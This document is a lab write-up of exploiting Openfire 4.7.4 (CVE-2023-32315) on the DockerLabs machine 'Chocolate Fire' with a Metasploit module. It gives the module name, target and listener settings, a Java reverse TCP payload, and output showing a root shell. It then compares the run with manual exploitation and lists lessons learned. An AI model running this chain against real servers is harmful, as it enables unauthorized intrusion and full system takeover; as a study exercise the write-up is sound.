# Chocolate Fire — Metasploit Exploitation

## Overview

This write-up documents the exploitation of Chocolate Fire using
Metasploit after completing a manual exploitation workflow.

The target was running Openfire 4.7.4 and was vulnerable to
CVE-2023-32315.

Unlike the manual exploitation, where administrative credentials were
used to upload a custom Java plugin, the Metasploit module automated
the vulnerability chain by abusing the authentication bypass,
creating a new administrative user, uploading a weaponized plugin,
and delivering a Java reverse shell payload.

## Target Information

| Information | Value |
|---|---|
| Platform | DockerLabs |
| Target IP | 172.17.0.2 |
| Application | Openfire 4.7.4 |
| Target Port | 9090 |
| Vulnerability | CVE-2023-32315 |
| Exploit | Metasploit |
| Payload | java/shell/reverse_tcp |
| Result | Root shell |

## Exploit Module

The Metasploit module was identified using:

search cve:2023-32315

The module found was:

```text
exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
```
The module description indicated that it uses the Openfire
authentication bypass to create a new administrator account and
upload a malicious management plugin containing a Java payload.

```text
CVE
 ↓
search
 ↓
module
```
## Module Configuration

The module was selected with:

```bash
use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
```
The target was configured as:
```bash
set RHOSTS 172.17.0.2
set LHOST 172.17.0.1
```
The module used:
```bash
RPORT      9090
SSL        false
TARGETURI  /
```
The selected payload was:
```bash
java/shell/reverse_tcp
```
with:
```bash
LHOST  172.17.0.1
LPORT  4444
```
# 7. Vulnerability Check

```markdown
## Vulnerability Check
```
Before exploitation, the module was tested with:

```bash
check
```
Metasploit returned:

The target appears to be vulnerable.
Openfire version is 4.7.4

This confirmed that the target matched the vulnerable version range.
```text
check ≠ exploit
```
## Exploitation

The exploit was launched with:

```bash
run
````
Metasploit first started the reverse TCP handler:
```text
Started reverse TCP handler on 172.17.0.1:4444
```
The module then performed the vulnerability chain.

First, it obtained the required session information:
```text
Grabbing the cookies.
```
It then created a new administrative user:
```text
Adding a new admin user.
```
Metasploit logged in using the generated administrative account and
proceeded to upload and execute an Openfire management plugin:
```text
Upload and execute plugin "..." with payload "java/shell/reverse_tcp".
```
The payload was then delivered to the target:
```text
Sending stage (...) to 172.17.0.2
```
Finally, a reverse command shell was established:
```text
Command shell session 1 opened
```

# 9. Shell verification

```markdown
## Shell Verification
```
The obtained shell was verified with:

```bash
whoami
```
Output:
```bash
root
```
The current working directory was also checked:
```bash
pwd
```
Output:
```bash
/mnt/openfire/bin
```
The exploitation therefore resulted in command execution with root
privileges.

The exploitation therefore resulted in command execution with root
privileges.
```text
whoami
  ↓
root
```
## Manual vs Metasploit

### Manual Exploitation

```text
Admin credentials
       ↓
Openfire Admin Console
       ↓
Plugin Upload
       ↓
Custom Java Plugin
       ↓
Runtime.exec("id")
       ↓
root
Metasploit Exploitation
CVE-2023-32315
       ↓
Authentication Bypass
       ↓
Create Admin User
       ↓
Login
       ↓
Weaponized Plugin
       ↓
Java Reverse TCP Payload
       ↓
Command Shell
       ↓
root
```
The main difference is that the Metasploit module automated the
authentication bypass, administrative account creation, plugin
generation/upload, payload delivery and reverse shell handling.

Manual exploitation provided greater visibility into the individual
steps, while Metasploit provided automation and repeatability.

# 11. Lessons Learned

```markdown
## Lesson Learned
```
- Metasploit modules automate complete exploitation workflows.
- Exploit modules and payloads have different responsibilities.
- `RHOSTS` identifies the target, while `LHOST` identifies the
  attacker's listening address.
- `check` can validate exploitability before executing the payload.
- `reverse_tcp` causes the target to initiate a connection back to
  the attacker.
- A successful RCE does not necessarily require privilege escalation.
- The privileges obtained through RCE depend on the context in which
  the vulnerable service is running.
- Manual exploitation helps understand the underlying attack chain,
  while Metasploit provides automation and repeatability.

## Cleanup

Metasploit reported that the generated plugin and administrative user
required manual cleanup through the Openfire Admin Console.

This is an important consideration when using automated exploitation
tools, as exploitation can leave artifacts on the target.

## Conclusion

Chocolate Fire was successfully exploited using the Metasploit module
for CVE-2023-32315.

The exercise provided a useful comparison between manual exploitation
and automated exploitation, while reinforcing the relationship between
vulnerability, exploit module, payload, handler and session.